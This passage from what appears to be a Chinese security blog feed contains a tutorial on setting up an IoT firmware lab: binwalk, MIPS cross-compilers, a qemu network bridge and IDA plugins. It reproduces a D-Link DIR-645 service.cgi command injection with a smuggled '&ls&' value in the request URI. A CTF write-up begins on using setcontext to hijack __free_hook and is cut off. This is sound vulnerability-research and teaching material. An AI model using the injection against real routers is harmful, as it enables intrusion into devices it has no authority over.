href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT环境配置V1&amp;入门练习</title>
      <link href="archives/6130b222/"/>
      <url>archives/6130b222/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里 IOT 环境主要是指<strong>路由器</strong>的分析环境，当然摄像头之类的设备也是能够进行分析的。</p><p>下面配置是基于 ubuntu18.04 进行配置。</p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>apt-get install 的 binwalk 是残缺版本，解析某些压缩固件时识别不了。因此选择到 github 仓库安装完整版本：</p><blockquote><p><a href="https://github.com/ReFirmLabs/binwalk/">https://github.com/ReFirmLabs/binwalk/</a></p></blockquote><p>apt 装的差点解释器，对于 ubuntu\debian 有提供一键脚本，安装的内容查阅<a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">官方文档</a>。py2 和 py3 都支持，py3 速度快点就装它了，手动安装方法看前面官方文档。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line"><span class="built_in">cd</span> binwalk</span><br><span class="line"><span class="comment"># 安装binwalk</span></span><br><span class="line">sudo python3 setup.py install</span><br><span class="line"><span class="comment"># 安装拓展</span></span><br><span class="line">sudo ./deps.sh</span><br></pre></td></tr></table></figure><p>其中 cramfsprogs 无法 apt 安装，要手动装下：</p><blockquote><p>参考师傅文章：<a href="https://blog.csdn.net/wuyou1995/article/details/106215540/">https://blog.csdn.net/wuyou1995/article/details/106215540/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://launchpadlibrarian.net/251826685/cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br><span class="line">sudo dpkg -i cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="使用指令"><a href="#使用指令" class="headerlink" title="使用指令"></a>使用指令</h3><p>按照预定的配置文件中提取方法从固件中提取探测到的文件及系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e filename.bin</span><br></pre></td></tr></table></figure><p>根据 magic 签名扫描结果进行递归提取：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me filename.bin</span><br></pre></td></tr></table></figure><p>限制递归提取深度，默认深度 8 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me -d 5 filename.bin</span><br></pre></td></tr></table></figure><h2 id="mips-交叉编译环境"><a href="#mips-交叉编译环境" class="headerlink" title="mips 交叉编译环境"></a>mips 交叉编译环境</h2><p>这个目前来说主要是用在 hook 某些函数让整个固件系统或单个程序能正常运行，或者是制作后门时用到。这个编译环境两种安装方法：buildroot 或者是 apt 直接安装编译好的版本。</p><h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>这种方法所网络环境约束<strong>极大</strong>，主要是那个内核文件资源在国外，挂着代理也下载很慢。也尝试过通过下载软件把内核文件下载下来，放到对应文件夹进行 make ，它还是会重新下载。最后去冬令营的时候，蹭 hw 的网就能下载到，虽然还是很慢，但起码能下完。</p><blockquote><p>参考师傅<a href="https://blog.csdn.net/QQ1084283172/article/details/68950682">文章</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装依赖库</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libncurs*</span><br><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/buildroot/buildroot.git</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 进行编译的配置</span></span><br><span class="line"><span class="built_in">cd</span> buildroot</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>下面进入到 gui 配置窗口，需要修改三个属性（由于版本位置可能不同）：</p><ul><li><p><code>Target Option</code>–<code>Target Architecture</code> 修改为 <code>MIPS(little endian)</code></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206212742.png" alt="image-20210206212735360"></p></li><li><p><code>Target Option</code>–<code>Target Architecture Variant</code> 修改为 <code>Generic MIPS32</code></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206212756.png" alt="image-20210206212756857"></p></li><li><p><code>Toolchain</code>–<code>Kernel Headers</code> 修改为小于等于主机内核的版本(查询指令：uname -r)，我本地为 4.15.0 ，那就选 4.14.x </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206213129.png" alt="image-20210206213129568"></p></li></ul><p>保存配置后退出</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206213247.png" alt="image-20210206213247200"></p><p>进行编译，最好设置代理编译过程会下载国外资源，保持网络通畅：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure><p>编译完成后在 output/host/bin 文件夹就能看到文件了，图中文件夹是我自己改了名字而已：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318173339.png" alt="image-20210318173306250"></p><p>将 output 文件夹改名字，然后重复上面步骤，安装 mipsel 交叉编译链。</p><h3 id="apt-install"><a href="#apt-install" class="headerlink" title="apt install"></a>apt install</h3><p>apt 直接安装编译好的版本，免去下载内核资源编译的问题。这种方法也同样使用安装 arm 等交叉编译链。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/wfxzf/article/details/88974144">https://blog.csdn.net/wfxzf/article/details/88974144</a></p></blockquote><h4 id="mips（大端序）"><a href="#mips（大端序）" class="headerlink" title="mips（大端序）"></a>mips（大端序）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install emdebian-archive-keyring</span><br><span class="line">sudo apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206235709.png" alt="image-20210206235709724"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207010045.png" alt="image-20210207010045821"></p><h4 id="mipsel（小端序）"><a href="#mipsel（小端序）" class="headerlink" title="mipsel（小端序）"></a>mipsel（小端序）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install emdebian-archive-keyring</span><br><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross libc6-mipsel-cross libc6-dev-mipsel-cross binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu g++-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207115930.png" alt="image-20210207115930839"></p><h2 id="qemu-虚拟机桥接网络"><a href="#qemu-虚拟机桥接网络" class="headerlink" title="qemu 虚拟机桥接网络"></a>qemu 虚拟机桥接网络</h2><p>这里是给下面 mips 虚拟机打下网络基础的，至于这个 mips 虚拟机作用后面说。qemu apt 装个静态版本就即可。</p><p>我们这步做的是在 ubuntu 虚拟机里面配置一个网桥 br0 ，一端链接宿主机分配，另一端链接 qemu 虚拟机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装网桥依赖</span></span><br><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br><span class="line"><span class="meta">#</span><span class="bash"> 备份原来配置文件</span></span><br><span class="line">sudo cp /etc/network/interfaces /etc/network/interface.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译配置文件</span></span><br><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>将文件内修改为如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>上面文件中的 <code>ens33</code> 可能需要根据自己系统网卡修改一下，我系统上没有 eht0 这个网卡，当填写网卡名是 eht0 ，等下重启失败，修改为 ens33 则成功。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207140952.png" alt="image-20210207140952068"></p><p>配置完成后，br0 获取宿主机分配的 ip ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318175835.png"></p><p>在其他文章中接下来会配置 qemu 的网络启动脚本，用下来这脚本有点问题，还是手动配置比较香。</p><h2 id="mips-虚拟机"><a href="#mips-虚拟机" class="headerlink" title="mips 虚拟机"></a>mips 虚拟机</h2><p>mips 虚拟机主要是用来给固件一个运行的 linux 环境，后面仿真固件就是将固件放入到里面运行。</p><p>虚拟机需要下载内核文件、磁盘镜像，下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;mips&#x2F;</span><br></pre></td></tr></table></figure><p>大小端根据固件版本自行调整</p><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p><code>ifconfig</code> 没有查看到 br0 网桥可以手动启动一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 192.168.211.7/24 up</span><br></pre></td></tr></table></figure><ul><li>Br0：网卡名</li><li>192.168.211.7：宿主机（vmware）分配的 ip 段，只有不冲突即可</li></ul><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318175835.png" alt="配置成功"></p><h4 id="网卡接口"><a href="#网卡接口" class="headerlink" title="网卡接口"></a>网卡接口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.211.50/24 up</span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure><ul><li>Tap0：网卡名称，后面 qemu 启动指定用这个网卡</li><li>192.168.211.50：同前一步</li><li><code>brctl addif</code>：网卡链接网桥</li></ul><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318193211.png" alt="配置成功"></p><h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure><ul><li>-kernel：指定内核版本</li><li>-hda：指定磁盘镜像</li><li><code>-netdev tap,id=tapnet,ifname=tap0</code>：指定 qemu 网络模式</li></ul><p>登录密码账号均为：<code>root</code>，在 qemu 虚拟机中给网卡配置 ip ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.211.51/24 up</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318194123.png" alt="image-20210318194120389"></p><p>从 qemu 虚拟机 ping 主机：</p><p>![image-20210318194302315](../../../../Library/Application Support/typora-user-images/image-20210318194302315.png)</p><p>从主机 ping qemu 虚拟机：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318194344.png" alt="image-20210318194340488"></p><h3 id="传输固件"><a href="#传输固件" class="headerlink" title="传输固件"></a>传输固件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.211.51:~/</span><br></pre></td></tr></table></figure><p>怎么启动固件系统，每个固件各有差异，结合实际分析。</p><h2 id="IDA-amp-plugin"><a href="#IDA-amp-plugin" class="headerlink" title="IDA &amp; plugin"></a>IDA &amp; plugin</h2><p>mips 反编译可以用 ghidra 或者 IDA7.5 ，下载去看雪、吾爱逛逛</p><p>ida 装两个插件方便审查和查询 gadget ，安装方法看官方 wiki</p><h3 id="mipsAudit"><a href="#mipsAudit" class="headerlink" title="mipsAudit"></a>mipsAudit</h3><p>采用 t3ls 修改版本：<a href="https://github.com/t3ls/mipsAudit">mipsAudit</a></p><h3 id="mipsrop"><a href="#mipsrop" class="headerlink" title="mipsrop"></a>mipsrop</h3><p><a href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop">https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop</a></p><h2 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h2><p>个人首选 gdb-multiarch ，偶尔会遇到 gdb 版本差异或者奇异原因而无法调试，然后用 ida 远程调试代替。</p><h3 id="IDA-远程调试（带符号表）"><a href="#IDA-远程调试（带符号表）" class="headerlink" title="IDA 远程调试（带符号表）"></a>IDA 远程调试（带符号表）</h3><p>这里调试时是用 qemu-user 模式用 <code>-g</code> 打开调试端口，确保被调试程序能正常运行，如果不能需要 hook 或者 peach 某些函数。</p><p>将需要调试文件拖到主机上，用 ida 打开程序，然后到 ubuntu -g 打开调试端口。ida 选 remote gdb ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207191440.png" alt="image-20210207191440733"></p><p>前两项都是自动识别文件在 mac 地址，最后一个就 ubuntu 调试端口：</p><blockquote><p>截图是没有打开调试端口，提示连不上</p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207191517.png" alt="image-20210207191516981"></p><h2 id="DIR-645-远程代码执行"><a href="#DIR-645-远程代码执行" class="headerlink" title="DIR-645 远程代码执行"></a>DIR-645 远程代码执行</h2><p>先拿一个 web 洞复现练手，不用写 mips shellcode 。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul><li><p>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）</p><p>版本号为 v1.02（v1.03完成修复）</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p>直接运行如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>沙盒堆溢出学习</title>
      <link href="archives/233/"/>
      <url>archives/233/</url>
      
        <content type="html"><![CDATA[<p>在复现 SWPUCTF2020 jailbreak 遇到打开沙盒堆溢出题目，这条题目实际上还有 chroot 逃逸，这个先放后面。沙盒堆溢出利用方法关键是 <code>setcontext()</code> ，以这个点搜寻其他同类题目。年前的高校战役 lgd ，七月份 DASCTF bigbear 。</p><h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/setcontext.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其作用是用户上下文的设置，所以我们在可以小范围控制执行流，已知 libc_base 但不足以完成我们的目标时，可以先跳 <code>setcontext+53</code> 来扩大控制范围。简单来说就是<strong>通过 setcontext 控制寄存器的值</strong>。</p><h3 id="setcontext-53-避免-crash"><a href="#setcontext-53-避免-crash" class="headerlink" title="setcontext+53 避免 crash"></a>setcontext+53 避免 crash</h3><p><strong>libc 2.27 下完整 setcontext 如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext&gt;:     push   rdi</span><br><span class="line">&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">&lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">&lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">&lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">&lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">&lt;setcontext+26&gt;:  syscall </span><br><span class="line">&lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;</span><br><span class="line">&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">&lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br><span class="line">&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78</span><br><span class="line">&lt;setcontext+135&gt;: neg    eax</span><br><span class="line">&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure><p><code>fldenv [rcx]</code>指令会造成程序执行的时候直接crash，所以要避开这个指令，跳转到 setcontext+53 。</p><h3 id="部署堆栈空间控制对应寄存器"><a href="#部署堆栈空间控制对应寄存器" class="headerlink" title="部署堆栈空间控制对应寄存器"></a>部署堆栈空间控制对应寄存器</h3><p>沙盒堆溢出题目利用是将 <code>__free_hook</code> 劫持为 <code>setcontext+53</code> ，当 free 堆块时堆地址作为参数放在 rdi 传入函数中，进入到 setcontext 就会以<strong>堆地址</strong>作为基址，将不同偏移地址上的数据放入寄存器。所以我们需要控制<strong>堆地址</strong>后面空间上的内容。</p><blockquote><p>注意：这里提前布置的数据并不是 srop 中的 frame！！！在其他题目的 wp 中使用 SigreturnFrame() 是方便生成而已，并不是说明填进去的是 frame。比如：</p><p><code>frame.rdi=0x123456</code> 最后 0x123456 是赋值到 rsi &lt;- <code>mov    rsi,QWORD PTR [rdi+0x70]</code></p><p>frame.rdi 的 0x123456 被传入 rsi </p></blockquote><p>构造 rsp 时需要注意 push rcx 的影响，如果 rsp 地址不可访问，程序就会 crash 。</p><h3 id="libc-2-29-之后变化"><a href="#libc-2-29-之后变化" class="headerlink" title="libc 2.29 之后变化"></a>libc 2.29 之后变化</h3><p><strong>libc 2.27 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 